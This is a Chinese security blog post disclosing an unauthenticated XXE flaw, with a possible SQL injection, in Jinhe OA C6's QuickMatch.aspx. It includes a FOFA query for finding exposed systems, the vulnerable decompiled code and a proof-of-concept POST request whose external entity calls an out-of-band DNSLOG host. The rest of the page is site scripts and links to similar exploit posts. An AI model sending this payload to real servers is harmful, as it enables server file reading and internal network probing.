---
title: "金和OA QuickMatch.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-QuickMatch-xxe-sqli.html
asset_dir: assets/金和oa-quickmatch.aspx-xxe漏洞
---

# 金和OA QuickMatch.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/1/4 13:31
* 271浏览
* [0评论](#comment)
* 8分钟阅读

深入探索

编码转换工具

网络安全课程

数据库


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `QuickMatch.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `QuickMatch.aspx` 在 `bin` 目录下查找 `JHSoft.Web.CrmCustomer.dll` 将其进行反编译后找到 **QuickMatch** 的处理逻辑

深入探索

服务器安全服务

Web安全课程

漏洞修复方案

```
public class QuickMatch : Page
{
  protected void Page_Load(object sender, EventArgs e)
  {
    XmlDocument xmlDocument = new XmlDocument();
    xmlDocument.Load(this.Request.InputStream);
```

请求内容直接使 `XmlDocument.Load` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

同时还存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞

[![金和OA QuickMatch.aspx XXE漏洞](images/img-001-8dd52b0f9f58.webp)](https://image.mrxn.net/1bca808d1eaa44918700793e355b4b16.webp)

# 漏洞复现

```
POST /c6/Jhsoft.Web.CrmCustomer/QuickMatch.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

网络安全

[![金和OA QuickMatch.aspx XXE漏洞](images/img-002-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA QuickMatch.aspx XXE漏洞](https://mrxn.net/jswz/jhsoft-QuickMatch-xxe-sqli.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-QuickMatch-xxe-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-QuickMatch-xxe-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-QuickMatch-xxe-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 